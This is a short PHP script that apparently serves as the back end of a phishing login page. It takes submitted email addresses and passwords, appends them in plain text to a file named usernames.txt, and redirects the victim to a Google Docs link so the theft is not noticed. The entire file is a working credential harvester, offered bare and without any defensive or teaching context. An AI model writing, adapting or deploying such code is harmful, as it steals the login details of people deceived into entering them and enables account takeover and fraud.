<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['email']) && isset($_POST['password'])) {

        $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
        $password = htmlspecialchars($_POST['password']);

        file_put_contents("usernames.txt", "Email: " . $email . ", Password: " . $password . "\n", FILE_APPEND);
        
        header('Location: https://docs.google.com/document/d/1ngV-OyQuhQ9cx3DFY-jF51Jqdy4RKU3iGbntYQbWMxc/edit?usp=sharing');
        exit();
    } else {
        echo "Email or password not set!";
    }
} else {
    echo "Not a POST request!";
}
